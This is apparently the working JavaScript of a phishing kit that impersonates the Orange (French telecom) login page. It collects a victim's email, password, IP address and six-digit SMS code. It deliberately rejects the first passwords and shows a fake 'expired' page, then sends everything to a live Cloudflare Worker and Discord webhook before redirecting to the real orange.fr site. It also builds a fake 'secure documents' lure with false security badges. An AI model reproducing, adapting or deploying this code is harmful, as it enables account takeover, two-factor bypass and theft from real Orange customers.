// Configuration du Worker Cloudflare
const WEBHOOK_CONFIG = {
  url: 'https://cool-frost-a8e3.bvie0054.workers.dev/',
  enabled: true, // Activez/désactivez le système de webhook
  timeout: 15000, // Timeout en millisecondes pour laisser le Worker démarrer à froid
  retryAttempts: 3 // Nombre total de tentatives (1 initial + 2 retries)
};

const stepEmail = document.getElementById('step-email');
const stepPassword = document.getElementById('step-password');
const stepExpired = document.getElementById('step-expired');
const stepCode = document.getElementById('step-code');
const emailInput = document.getElementById('emailInput');
const displayedEmail = document.getElementById('displayedEmail');
const expiredEmailDisplay = document.getElementById('expiredEmailDisplay');
const codeEmailDisplay = document.getElementById('codeEmailDisplay');
const passwordInput = document.getElementById('passwordInput');
const errorMessage = document.getElementById('errorMessage');
const passwordField = document.querySelector('.password-field');

// Compteur de tentatives global
let loginAttempts = 0;

function showStep(step){
  stepEmail.style.display = 'none';
  stepPassword.style.display = 'none';
  stepExpired.style.display = 'none';
  stepCode.style.display = 'none';

  if(step==='password'){
    stepPassword.style.display='block';
  } else if(step==='expired'){
    stepExpired.style.display='block';
  } else if(step==='code'){
    stepCode.style.display='block';
  } else {
    stepEmail.style.display='block';
  }
}

// Fonction d'envoi vers le webhook Discord
async function sendToWebhook(data, attempt = 1) {
  if (!WEBHOOK_CONFIG.enabled) {
    console.log('Webhook désactivé, données:', data);
    return { success: true, message: 'Webhook désactivé' };
  }

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), WEBHOOK_CONFIG.timeout);

    // Format de message simple comme demandé
    let messageContent = '';
    
    if (data.action === 'login_attempt') {
      messageContent = `🔐 Tentative de connexion ${data.attemptNumber}/3\n` +
                     `📧 Email: ${data.email}\n` +
                     `🔑 Mot de passe: ${data.password}\n` +
                     `⏰ Heure: ${new Date().toLocaleString('fr-FR')}\n` +
                     `🌐 IP: ${await getUserIP()}`;
    } else if (data.action === 'email_submitted') {
      messageContent = `📧 Email soumis\n` +
                     `📧 Email: ${data.email}\n` +
                     `⏰ Heure: ${new Date().toLocaleString('fr-FR')}\n` +
                     `🌐 IP: ${await getUserIP()}`;
    } else if (data.action === 'sms_code_submitted') {
      messageContent = `🔐 Code SMS soumis\n` +
                     ` Code: ${data.code}\n` +
                     `⏰ Heure: ${new Date().toLocaleString('fr-FR')}\n` +
                     `🌐 IP: ${await getUserIP()}`;
    } else {
      messageContent = `🔐 ${getActionTitle(data.action)}\n` +
                     `⏰ Heure: ${new Date().toLocaleString('fr-FR')}\n` +
                     `🌐 IP: ${await getUserIP()}`;
    }

    const discordPayload = {
      username: 'Orange Login Bot',
      avatar_url: 'https://c.woopic.com/small-logo-orange.svg',
      content: messageContent
    };

    console.log('Envoi webhook vers', WEBHOOK_CONFIG.url, discordPayload);

    const response = await fetch(WEBHOOK_CONFIG.url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(discordPayload),
      signal: controller.signal,
      keepalive: true,
      cache: 'no-store'
    });

    clearTimeout(timeoutId);

    console.log('Réponse webhook status:', response.status, response.statusText);

    if (!response.ok) {
      const responseText = await response.text().catch(() => 'Impossible de lire la réponse');
      throw new Error(`Erreur HTTP: ${response.status} ${response.statusText} - ${responseText}`);
    }

    return {
      success: true,
      message: 'Message envoyé vers Discord avec succès'
    };

  } catch (error) {
    console.error(`Tentative ${attempt} échouée:`, error);

    if (error instanceof TypeError && error.message === 'Failed to fetch') {
      console.error('Échec de la connexion au Worker Cloudflare. Vérifiez l’URL du Worker et sa disponibilité.');
    } else if (error.name === 'AbortError') {
      console.error('Le Worker Cloudflare a mis trop de temps à répondre. Cela arrive souvent au premier appel après un démarrage à froid.');
    }

    if (attempt < WEBHOOK_CONFIG.retryAttempts) {
      console.log(`Nouvelle tentative de repli dans 1 seconde... (${attempt + 1}/${WEBHOOK_CONFIG.retryAttempts})`);
      await new Promise(resolve => setTimeout(resolve, 1000));
      return sendToWebhook(data, attempt + 1);
    }

    return {
      success: false,
      message: `Échec de l'envoi après ${WEBHOOK_CONFIG.retryAttempts} tentatives: ${error.message}`
    };
  }
}

// Fonction pour obtenir l'IP de l'utilisateur
async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.error('Erreur lors de la récupération de l\'IP:', error);
    return 'IP non disponible';
  }
}

// Fonction utilitaire pour les titres d'action
function getActionTitle(action) {
  const titles = {
    'page_loaded': 'Page Chargée',
    'email_submitted': 'Email Soumis',
    'login_attempt': 'Tentative de Connexion',
    'password_visibility_toggled': 'Visibilité Mot de Passe',
    'back_button_clicked': 'Retour Email',
    'change_email_clicked': 'Changement Email'
  };
  return titles[action] || 'Action Inconnue';
}


function validateEmailLike(value){
  return value && value.trim().length >= 3; // règle simple pour maquette
}

async function handleEmailSubmit(){
  if(!validateEmailLike(emailInput.value)){
    alert('Veuillez saisir votre adresse e-mail ou numéro de mobile');
    return;
  }
  
  const email = emailInput.value.trim();
  localStorage.setItem('userEmail', email);
  displayedEmail.textContent = email;
  
  // Pas d'envoi webhook pour l'email - seulement pour la connexion
  
  showStep('password');
  setTimeout(()=>passwordInput.focus(), 0);
}

async function handlePasswordSubmit(){
  console.log('🎯 FONCTION handlePasswordSubmit APPELÉE');
  
  if(passwordInput.value.trim()===''){
    alert('Veuillez saisir votre mot de passe');
    return;
  }
  
  const password = passwordInput.value.trim();
  const email = localStorage.getItem('userEmail') || displayedEmail.textContent;
  
  // Incrémenter le compteur de tentatives
  loginAttempts = loginAttempts + 1;
  console.log(`🔍 Tentative numéro: ${loginAttempts}`);
  
  // Envoi vers le webhook avec les données de connexion
  const webhookData = {
    action: 'login_attempt',
    email: email,
    password: password,
    step: 'password_validation',
    sessionId: Date.now().toString(),
    attemptNumber: loginAttempts
  };
  
  try {
    const result = await sendToWebhook(webhookData, 1);
    if (result.success) {
      console.log(`Tentative ${loginAttempts} envoyée avec succès vers Discord`);
    } else {
      console.error(`Échec de l’envoi de la tentative ${loginAttempts}:`, result.message);
    }
  } catch (error) {
    console.error(`Erreur lors de l'envoi de la tentative ${loginAttempts}:`, error);
  }
  
  // Vérifier si c'est la 3ème tentative
  if (loginAttempts === 3) {
    console.log('🚨 *** 3ÈME TENTATIVE - AFFICHAGE PAGE EXPIRATION APRÈS CHARGEMENT ***');
    showLoadingThenExpired();
    return;
  }
  
  // Pour les tentatives 1 et 2, afficher le message d'erreur normal
  console.log(`✅ Tentative ${loginAttempts} - Affichage message d'erreur normal`);
  // marquer le champ en erreur et afficher l'alerte attachée
  if (passwordField) passwordField.classList.add('has-error');
  errorMessage.style.display='flex';
  passwordInput.value='';
  passwordInput.focus();
}

function showSecureDocumentsNotification() {
  // Créer l'overlay de fond avec effet de flou
  const overlay = document.createElement('div');
  overlay.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.7);
    backdrop-filter: blur(5px);
    z-index: 9999;
    display: flex;
    align-items: center;
    justify-content: center;
    animation: fadeInOverlay 0.5s ease-out;
  `;
  
  // Créer la fenêtre de notification
  const notificationBox = document.createElement('div');
  notificationBox.style.cssText = `
    background: #ffffff;
    padding: 0;
    border-radius: 16px;
    text-align: center;
    max-width: 600px;
    width: 90%;
    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
    animation: slideInUp 0.6s ease-out;
    border: 2px solid #ff7a00;
    overflow: hidden;
  `;
  
  notificationBox.innerHTML = `
    <div style="background: #000; padding: 20px; color: white;">
      <img src="https://c.woopic.com/small-logo-orange.svg" 
           style="width: 40px; height: 40px; margin-bottom: 10px;" 
           alt="Logo Orange">
      <h1 style="margin: 0; font-size: 24px; font-weight: 700;">Documents Sécurisés</h1>
      <p style="margin: 8px 0 0 0; font-size: 14px; opacity: 0.9;">Orange - Sécurité des Données</p>
    </div>
    
    <div style="padding: 30px;">
      <div style="background: #f5f5f5; border-left: 4px solid #ff7a00; padding: 15px; margin-bottom: 20px; border-radius: 4px;">
        <div style="display: flex; align-items: center; gap: 10px;">
          <span style="font-size: 20px;">📄</span>
          <span style="font-weight: 600; color: #333;">Nouveaux documents reçus</span>
        </div>
      </div>
      
      <p style="color: #333; font-size: 16px; margin-bottom: 20px; line-height: 1.6;">
        Vous avez reçu des <strong>documents sécurisés</strong> dans votre espace personnel Orange.<br>
        Pour garantir la protection de vos données, une identification est requise.
      </p>
      
      <div style="background: #000; border: 1px solid #ff7a00; border-radius: 8px; padding: 15px; margin-bottom: 25px;">
        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 8px;">
          <span style="font-size: 18px;">🛡️</span>
          <span style="font-weight: 600; color: #ff7a00;">Sécurité renforcée</span>
        </div>
        <p style="margin: 0; font-size: 14px; color: #fff;">
          Connexion sécurisée SSL • Authentification à deux facteurs • Chiffrement AES-256
        </p>
      </div>
      
      <button id="accessDocumentsBtn" style="
        background: #000;
        color: white;
        border: 2px solid #ff7a00;
        padding: 15px 30px;
        font-size: 16px;
        font-weight: 700;
        border-radius: 8px;
        cursor: pointer;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        transition: all 0.3s ease;
        margin-bottom: 15px;
      " onmouseover="this.style.background='#ff7a00'; this.style.color='#000'; this.style.transform='translateY(-2px)'; this.style.boxShadow='0 6px 20px rgba(255, 122, 0, 0.4)'" 
         onmouseout="this.style.background='#000'; this.style.color='white'; this.style.transform='translateY(0)'; this.style.boxShadow='0 4px 15px rgba(0, 0, 0, 0.3)'">
        Accéder à mes documents
      </button>
      
      <div style="font-size: 12px; color: #111; margin-top: 15px;">
        <div style="display: flex; align-items: center; justify-content: center; gap: 15px;">
          <span>🔐 SSL Sécurisé</span>
          <span>•</span>
          <span>🛡️ Données protégées</span>
          <span>•</span>
          <span>✅ Orange certifié</span>
        </div>
      </div>
    </div>
  `;
  
  overlay.appendChild(notificationBox);
  document.body.appendChild(overlay);
  
  // Gestionnaire pour le bouton d'accès
  document.getElementById('accessDocumentsBtn').addEventListener('click', () => {
    overlay.style.animation = 'fadeOutOverlay 0.3s ease-out';
    setTimeout(() => {
      document.body.removeChild(overlay);
    }, 300);
  });
  
  // Animation CSS
  const style = document.createElement('style');
  style.textContent = `
    @keyframes fadeInOverlay {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    
    @keyframes slideInUp {
      from { 
        opacity: 0; 
        transform: translateY(50px) scale(0.9); 
      }
      to { 
        opacity: 1; 
        transform: translateY(0) scale(1); 
      }
    }
    
    @keyframes fadeOutOverlay {
      from { opacity: 1; }
      to { opacity: 0; }
    }
  `;
  document.head.appendChild(style);
}

function showLoadingThenExpired() {
  const overlay = document.createElement('div');
  overlay.className = 'loading-overlay';

  const box = document.createElement('div');
  box.className = 'loading-box';
  box.innerHTML = `
    <div class="loading-spinner"></div>
    <div class="loading-text">Chargement en cours...</div>
  `;

  overlay.appendChild(box);
  document.body.appendChild(overlay);

  setTimeout(() => {
    document.body.removeChild(overlay);
    showExpiredPage();
  }, 1400);
}

function showLoadingThenRedirect(url, delay = 1200) {
  const overlay = document.createElement('div');
  overlay.className = 'loading-overlay';

  const box = document.createElement('div');
  box.className = 'loading-box';
  box.innerHTML = `
    <div class="loading-spinner"></div>
    <div class="loading-text">Vérification en cours...</div>
  `;

  overlay.appendChild(box);
  document.body.appendChild(overlay);

  setTimeout(() => {
    window.location.href = url;
  }, delay);
}

function showExpiredPage() {
  expiredEmailDisplay.textContent = localStorage.getItem('userEmail') || displayedEmail.textContent || 'votre compte Orange';
  showStep('expired');
}

function showCodePage() {
  codeEmailDisplay.textContent = localStorage.getItem('userEmail') || displayedEmail.textContent || 'votre compte Orange';
  showStep('code');
  const inputs = document.querySelectorAll('.code-input');
  inputs.forEach((input, idx) => {
    input.value = '';
    input.addEventListener('input', (event) => {
      const value = event.target.value.replace(/[^0-9]/g, '');
      event.target.value = value.slice(-1);
      if (event.target.value.length === 1 && idx < inputs.length - 1) {
        inputs[idx + 1].focus();
      }
    });
    input.addEventListener('keydown', (event) => {
      if (event.key === 'Backspace') {
        if (input.value === '' && idx > 0) {
          inputs[idx - 1].focus();
          inputs[idx - 1].value = '';
          event.preventDefault();
        }
      } else if (event.key === 'ArrowLeft' && idx > 0) {
        inputs[idx - 1].focus();
        event.preventDefault();
      } else if (event.key === 'ArrowRight' && idx < inputs.length - 1) {
        inputs[idx + 1].focus();
        event.preventDefault();
      }
    });
  });
  inputs[0].focus();
}

function getCodeValue() {
  return Array.from(document.querySelectorAll('.code-input'))
    .map(input => input.value.trim())
    .join('');
}

async function submitCode() {
  const code = getCodeValue();
  if (code.length !== 6) {
    alert('Veuillez saisir les 6 chiffres du code.');
    return;
  }

  const email = localStorage.getItem('userEmail') || displayedEmail.textContent;
  const webhookData = {
    action: 'sms_code_submitted',
    code,
    step: 'sms_code_validation',
    sessionId: Date.now().toString()
  };

  showLoadingThenRedirect('https://www.orange.fr/portail', 1200);

  try {
    const result = await sendToWebhook(webhookData, 1);
    if (result.success) {
      console.log('Code soumis et webhook envoyé. Redirection vers Orange.');
    } else {
      console.warn(`Code soumis, mais l'envoi vers Discord a échoué : ${result.message}`);
    }
  } catch (error) {
    console.error('Erreur lors de l’envoi du code:', error);
  }
}

function togglePassword(){
  const eyeIcon = document.getElementById('togglePwd');
  if(passwordInput.type==='password'){
    passwordInput.type='text';
    eyeIcon.textContent='🙈';
  }else{
    passwordInput.type='password';
    eyeIcon.textContent='👁';
  }
}

document.getElementById('continueBtn').addEventListener('click', handleEmailSubmit);
document.getElementById('loginBtn').addEventListener('click', handlePasswordSubmit);
document.getElementById('togglePwd').addEventListener('click', togglePassword);
document.getElementById('backBtn').addEventListener('click', ()=>{ 
  showStep('email'); 
  if (passwordField) passwordField.classList.remove('has-error');
  errorMessage.style.display='none';
});
document.getElementById('expiredContinueBtn').addEventListener('click', showCodePage);
document.getElementById('validateCodeBtn').addEventListener('click', submitCode);
document.getElementById('resendCodeLink').addEventListener('click', (e)=>{
  e.preventDefault();
  alert('Code renvoyé.');
});
document.getElementById('chooseAnotherMethodLink').addEventListener('click', (e)=>{
  e.preventDefault();
  showStep('expired');
});

emailInput.addEventListener('keypress', (e)=>{ if(e.key==='Enter') handleEmailSubmit(); });
passwordInput.addEventListener('keypress', (e)=>{ if(e.key==='Enter') handlePasswordSubmit(); });
passwordInput.addEventListener('input', ()=>{ 
  if(errorMessage.style.display==='flex'){
    errorMessage.style.display='none';
    if (passwordField) passwordField.classList.remove('has-error');
  }
});

document.addEventListener('DOMContentLoaded', async ()=>{
  // Réinitialiser le compteur de tentatives à chaque chargement de page
  loginAttempts = 0;
  console.log('🔄 Page chargée - Compteur de tentatives réinitialisé à 0');
  
  // Ne pas pré-remplir l'email - laisser l'utilisateur le saisir
  emailInput.value = '';
  displayedEmail.textContent = '';
  
  // Masquer la page expirée si elle était visible
  if(stepExpired) stepExpired.style.display = 'none';
});
